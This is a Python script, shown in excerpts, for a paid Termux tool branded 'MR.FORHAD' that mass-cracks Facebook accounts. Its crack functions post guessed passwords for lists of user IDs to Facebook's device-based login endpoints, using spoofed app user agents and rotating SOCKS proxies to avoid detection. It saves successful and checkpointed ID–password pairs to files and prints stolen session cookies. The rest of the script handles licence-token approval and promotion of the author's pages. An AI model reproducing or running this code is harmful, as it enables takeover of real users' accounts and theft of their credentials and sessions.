...
time.sleep(2)
#os.system('clear')
print('\033[91;1m[\x1b[31;5;50m+\033[91;1m] \x1b[31;5;50mUPDATE VERSHON 0.2...! ')
os.system("espeak -a 300 \"UPDATE VERSION 0.2,\"")
time.sleep(2)
#os.system('clear')
print("\033[95;1m[\x1b[35;5;50m+\033[97;1m]\x1b[35;5;50m FLOW MY FACEBOOK PAGE..!")
os.system("espeak -a 300 \"FLOW,MY,FACEBOOK,PAGE,\"")
time.sleep(2)
os.system(f'xdg-open https://www.facebook.com/Real.king.ok')
os.system(f'xdg-open https://www.facebook.com/abl.not.allow.ok.bro?mibextid=ZbWKwL')
...
for xd in range(10000):
  ...
  uazz = f'[FBAN/MobileAdsManagerAndroid;FBAV/{net}.0.0.21.117;FBPN/com.facebook.adsmanager;FBLC/en_US;FBBV/{fbbv};FBCR/null;FBMF/Xiaomi;FBBD/Redmi;FBPN/com.facebook.katana;FBDV/Redmi Note 8T;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]'
  ugm = f"[FBAN/FB4A;FBAV/"+net+".467.1.0.52.83;FBBV/452416153;FBDM/{density=2.625,width=1080,height=1920};FBLC/pt_BR;FBRV/"+str(random.randint(000000000,999999999))+";FBCR/Airtel;FBBD/Realme;FBPN/com.facebook.katana;FBDV/"+zov+";FBSV/9;FBOP/1;FBCA/arm64-v8a:;]"
...
prinCP=[]
try:
    prox= requests.get('https://wa.me/qr/32XJZSUEMQYEA1').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/Dx-Forhad0090/Approval.-txt').text
        ua=open('bbnew.txt','w')
...
def back():
    login()
def contact():
    os.system('xdg-open https://www.facebook.com/Real.king.ok')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
    for e in u + "\n":sys.stdout.write(e);sys.stdout.flush();time.sleep(3.03)
os.system('xdg-open https://www.facebook.com/abl.not.allow.ok.bro?mibextid=ZbWKwL')
logo ="""
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 ║\033[1;33m●▬▬▬▬▬๑🌸🕌۩[Bismillahir Rahmanir Rahim]۩🕌🌸๑▬▬▬▬▬▬●\033[0;91m║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
    \033[1;32m███████╗ ██████╗ ██████╗ ██╗  ██╗ █████╗ ██████╗ 
    \033[1;32m██╔════╝██╔═══██╗██╔══██╗██║  ██║██╔══██╗██╔══██╗
    \033[1;32m█████╗  ██║   ██║██████╔╝███████║███████║██║  ██║
    ...
    \033[1;32m╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝
 ╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
 ║\033[1;33m[<🕌Assalamualaikum"Mind It,'You Will Never Alone🕴️>]\033[0;95m║
 ╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[1;31m==================================================
\033[1;32m[F] AUTHOR       :      MR.FORHAD 
\033[1;34m[O] TOOLS        :      FILE-CLONING
\033[1;37m[R] TYPE         :      𝗣𝗔𝗜𝗗(𝐔𝐬𝐞𝐫 𝐎𝐧𝐥𝐲)
\033[1;36m[H] FACEBOOK     :      MD FORHAD HOSEN
\033[1;31m[A] VERSION      :      0.2
\033[1;33m[D] MESSENGER    :      FORHAD TERMUX ZONE
=================================================="\033[1;23m"""                                
...
def meyexudi():
  ...
  id = "-".join(uuid)
  try:
    httpCaht = requests.get('https://github.com/Dx-Forhad0090/Approval.-txt/tree/main').text
    if id in httpCaht:
      print(fuckyoursali)
      ...
      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+8801839666164?text='+tks),approval()      
      time.sleep(1)
      meyexudi()
  except:
    sys.exit()
...
os.system('espeak -a 300 " Welcome,   to,  MR.FORHAD,  PAID,   Tools"')
def back():
	login()
...
while attemps < 12345677901:
    ...
    if username == 'Forhad' and password == 'Liya':
...
def menu():
    ...
    if HEART in ['111']:
        ...
        os.system('https://www.facebook.com/Real.king.ok')
        os.system("python nono.py")
    elif HEART in ['3','03']:
        result()
    elif HEART in ['0']:
...
def passwrd():
    ...
    print("\033[1;91m[\033[1;92m√\033[1;91m] \033[1;91m𝐂𝐋𝐎𝐍𝐈𝐍𝐆 𝐒𝐏𝐄𝐄𝐃 𝐒𝐔𝐏𝐄𝐑 𝐅𝐀??𝐓 ⏩")
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;95m{bo}[FORHAD🔍•M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            p = ses.get('https://p.facebook/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://web.facebook.com/login/save-device/","flow":"login_no_pin","pass":pw,}
    ...
    # 'cookie': 'datr=w1RQZh5mj-r-yDMxH8k2CeTv; sb=w1RQZsMnYtymJ2S1DDHkW4Ur; m_pixel_ratio=2.75; wd=393x783; fr=0d8CedDCX0nKDMsxW..BmUFTD..AAA.0.0.BmUFVF.AWX-Hv-yiFk',
    'dpr': '2.75',
    ...
    'viewport-width': '980',
            ...
            po = ses.post('https://p.facebook/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[FORHAD-Cp]✅Uid┏━➤ {idf} 🔑Pass┏━➤{pw}')
                ...
                print(f'\r\033[0;96m[FORHAD-Ok🌺] ✅Uid┏━➤ {idf} 🔑Pass┏━➤ {pw}\n\033[0;91m[🌼]= COOKIES • \033[0;91m{kuki} ')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[FORHAD🔍•M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            ses.headers.update({"Host":'x.facebook.com.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.7","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
            p = ses.get('https://free.facebook/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&_rdr')
            dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),"uid":idf,"next":"https://mbasic.facebook/login/save-device/","flow":"login_no_pin","pass":pw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            heade = {'Host': 'free.facebook',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    ...
    'viewport-width': '980',
            ...
            po = ses.post('https://free.facebook/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•FORHAD-Cp] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
                os.system('espeak -a 300 "   Cp"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•FORHAD-Ok] ✅Uid┏━➤ {idf} 🔑Pass┏━➤')
                os.system('espeak -a 300 " Congratulation,  You,  Have,  Got,  Ok,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
